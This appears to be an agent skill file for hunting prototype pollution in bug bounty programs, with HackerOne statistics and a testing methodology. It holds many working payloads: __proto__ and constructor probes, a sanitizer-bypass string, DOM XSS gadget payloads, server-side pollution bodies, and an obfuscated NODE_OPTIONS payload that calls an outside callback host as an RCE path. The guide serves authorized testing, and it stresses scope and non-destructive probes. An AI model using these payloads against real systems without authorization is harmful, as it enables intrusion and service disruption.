---
name: prototype-pollution
description: >-
  Hunt prototype pollution and object injection. Use when testing JS merges, query parsers, jQuery.extend, lodash, config loaders, and client-side state. Backed by 59 disclosed HackerOne reports.
---

# Prototype Pollution & Client-Side Object Injection — HackerOne field guide

Built from **59** publicly disclosed HackerOne reports (2017–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **59** · paid: **2**
- Median bounty **$3,000** · p90 **$3,000** · max **$3,000** · total **$6,000**
- Median upvotes **5**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 2 | $6,000 | 106 |
| Node.js third-party modules | 47 | $0 | 260 |
| Node.js | 4 | $0 | 49 |
| ExpressionEngine | 2 | $0 | 51 |
| Elastic | 1 | $0 | 157 |
| 8x8 | 1 | $0 | 17 |
| Stripe | 1 | $0 | 17 |
| Automattic | 1 | $0 | 7 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`query string` `JSON body` `cookies` `config` `merge`

## Tools

`Burp` · `DOM Invader` · `ppmap` · `browser console`

## Escalation chains

- Prototype pollution -> DOM XSS.
- Prototype pollution -> auth bypass.

## Related

- `xss` (2,569 reports)
- `rce` (1,399 reports)
- `logic-and-design` (931 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, flows to look

- Work the **source → gadget → sink** model explicitly (OWASP WSTG / PortSwigger). Pollution alone is rarely a finding: you need (1) an input that reaches a recursive merge/clone/path-assignment, and (2) code that later reads the planted property and uses it in a sensitive sink.
- Client-side source probes, in order (PortSwigger Academy): append each to every interesting URL and inspect `Object.prototype` in the console:
  - `/?__proto__[foo]=bar` (bracket notation)
  - `/?__proto__.foo=bar` (dot notation)
  - `/#__proto__[foo]=bar` (hash/fragment routes)
  - postMessage bodies carrying `{"__proto__":{"foo":"bar"}}`
  - JSON body reflection: `{"__proto__":{"foo":"bar"}}` on profile/settings/config endpoints.
- If `__proto__` is filtered, try the **constructor path** — every non-null-prototype object exposes `constructor.prototype`: `?constructor[prototype][foo]=bar`, `?constructor.prototype.foo=bar`. This defeats the common "strip `__proto__` key" defense.
- If keys are sanitized once, try **recursive-stripping bypass**: `__pro__proto__to__.gadget=payload` reduces to `__proto__.gadget=payload` when the sanitizer removes `__proto__` a single time. Also try URL-encoded, double-encoded, and Unicode-variant forms (`%5f%5fproto%5f%5f`, `\u005f\u005fproto\u005f\u005f`).
- Library fingerprints to grep JS bundles for: `_.merge`, `_.defaultsDeep`, `_.set`, `_.setWith`, `jQuery.extend(true,...)`, `lodash.merge`, `Object.assign`, `$.extend`, `merge` from `deepmerge`, `mergeWith`. Check versions: lodash < 4.17.5 (`merge`/`set`/`defaultsDeep`), CVE-2018-3721 / CVE-2019-10744 fixed in 4.17.11; some ≥4.17.12 builds still allow `constructor.prototype`.
- Server-side sources are most often **JSON body merge endpoints**: address/profile update, preferences, settings, search filters, import/config upload. Look for `JSON.parse()` followed by a merge — `JSON.parse` creates `__proto__` as an *own* property, which a vulnerable merge then reinterprets as a setter.
- DOM Invader (Burp built-in browser): enable Prototype pollution under Attack types, reload, use **Test** to verify the source, then **Scan for gadgets** and let it auto-generate an `alert()` PoC. It covers query string, hash, and web-message JSON automatically — far faster than reading minified bundles.
- Third-party **gadget** hotspots from PortSwigger Research: Google Analytics `hitCallback` → `setTimeout`; Google Tag Manager `sequence` → `eval`, `event_callback` → `setTimeout`; Adobe DTM `cspNonce` and `bodyHiddenStyle` → `innerHTML`, `trackingServerSecure` → `script.src` (host controllable). A site can be vulnerable through a library it never wrote.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Manual source confirmation: `Object.prototype.foo` in DevTools returns `"bar"` → polluted; `undefined` → not. Never infer success from the page's visible behavior alone.
- Browser-API gadgets (PortSwigger "Widespread prototype pollution gadgets"):
  - `Object.prototype.body="foo=bar"; fetch('/', {method:"POST"})` — controls the options object the site doesn't fully populate.
  - `Object.defineProperty` descriptor poisoning via `Object.prototype.value`: even a `writable:false, configurable:false` property can be overwritten if the descriptor omits `value`.
  - `Object.prototype.configurable = true` can make a property redefinable → possible sandbox escape.
  - `localStorage.foo` (property access) inherits the polluted value; `localStorage.get('foo')` does not.
- Lab-grade client PoC: `/?__proto__[transport_url]=data:,alert(1);` where an undefined `config.transport_url` flows into a dynamically appended `<script src>`; GTM's `sequence` needs a trailing `-` because it lands in a numeric JS expression (`?__proto__[sequence]=alert(document.domain)-`).
- **Server-side, non-destructive detection** (PortSwigger Research, use these — a naive pollution can persist for the whole Node process and DoS the app):
  - `{"__proto__":{"json spaces":" "}}` → later JSON responses gain indentation (Express ≤ 4.17.3).
  - `{"__proto__":{"exposedHeaders":["foo"]}}` → response gains `Access-Control-Expose-Headers: foo` (requires CORS module).
  - `{"__proto__":{"status":555}}` → pick an obscure 4xx/5xx; force an error (break JSON), observe the error object's `status`/`statusCode` change to 555. Reliable and reversible.
  - `{"__proto__":{"head":true}}` → `OPTIONS` response drops `HEAD` from the allowed-methods list.
  - `{"__proto__":{"allowDots":true}}` → `?foo.bar=baz` starts building nested objects; also a chain primitive.
  - `{"__proto__":{"parameterLimit":1}}` → second query param disappears from reflection; choose a high value to avoid breaking the app.
  - `{"__proto__":{"content-type":"text/html; charset=UTF-7"}}` → UTF-7 decoding of a previously inert reflected value (body-parser gadget).
- **JSON-reflection probes** (when no framework gadget exists):
  - `{"unusualName":"value","__proto__":"test"}` — if `unusualName` is reflected but `__proto__` is not, and the value persists after removal, suspect pollution.
  - Lodash-specific: `{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}` — if only `b` is reflected, that confirms `key in object` is seeing the polluted prototype (the inherited `a` is skipped by `assignMergeValue`).
- **Immutable-prototype generic probe**: assigning a primitive to `__proto__.__proto__` is a no-op, assigning an object throws a TypeError. Trigger the difference through library path traversal (Blitz-style `referentialEqualities: {"path": ["__proto__.targetKey"]}`) to detect pollution without a console.
- **OAST escalation primitive** (Gareth Heyes): `{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"}}` → DNS callback if a Node sink such as `exec`/`fork` is reachable; the doubled quotes obfuscate the host from WAF scrapers. This is both a detector and an RCE path (devtools inspector).
- Express XSS escalation: `{"__proto__":{"_body":true,"body":"<script>evil()</script>"}}` with `res.send(obj)` can flip the content-type to HTML and reflect the payload — destructive/persistent, so only use on lab or owned targets, or after confirming with a safe probe first.
- `{"__proto__":{"ignoreQueryPrefix":true}}` and `allowDots` are quieter chain primitives for cache-poisoning / parameter-smuggling follow-ups.

### C. Validation / proof bar — how to confirm and avoid false positives

- **Never start with a destructive probe.** Server-side pollution lasts for the lifetime of the Node process; a bad `encoding`, `Object.keys`, or `body` pollution can take the app down for everyone. Always begin with `status`, `json spaces`, `exposedHeaders`, or `OPTIONS` probes and a unique probe value.
- Confirm on a **second, independent request** after the polluting request (pollution must persist across requests), and confirm the change reverts when the polluting property is removed where possible. A one-off reflection is not pollution.
- For client-side, require both halves: a verified polluted property *and* a gadget reaching a real sink (`innerHTML`, `eval`, `script.src`, `setTimeout`, `fetch`). A polluted `Object.prototype` with no reachable gadget is typically closed as informational — say so in the report rather than claiming XSS.
- Prefer DOM Invader's Exploit-generated `alert()` as the client proof; for server-side, capture before/after response pairs (header set, status code, JSON indentation) with the exact polluting body.
- For RCE/OAST claims, require an actual Collaborator/DNS interaction tied to a unique token, not a WAF that scrapes hostnames. The doubled-quote obfuscated payload reduces that false positive.
- Third-party gadget findings: name the library and version and show the site loads it; Google has historically declined to fix GTM/GA gadgets, arguing it's the site's responsibility to avoid pollution sources — report to the site.
- Avoid the classic false positive: `hasOwnProperty` behavior on `JSON.parse` objects differs from object literals. `{"__proto__":"x"}` being *reflected* is not pollution — it's just a JSON key. Use the persistence and framework-effect probes above.
- Clean up lab state by restarting the Node process between experiments; on real targets, stop after one non-destructive confirmation and do not attempt to "un-pollute" by overwriting with junk values.

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/research/server-side-prototype-pollution
2. https://portswigger.net/research/widespread-prototype-pollution-gadgets
3. https://portswigger.net/blog/finding-client-side-prototype-pollution-with-dom-invader
4. https://portswigger.net/web-security/prototype-pollution/client-side
5. https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution
6. https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution
7. https://wstg.owasp.org/latest/11-Injection/21-Prototype_Pollution/
8. https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html
9. https://hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html
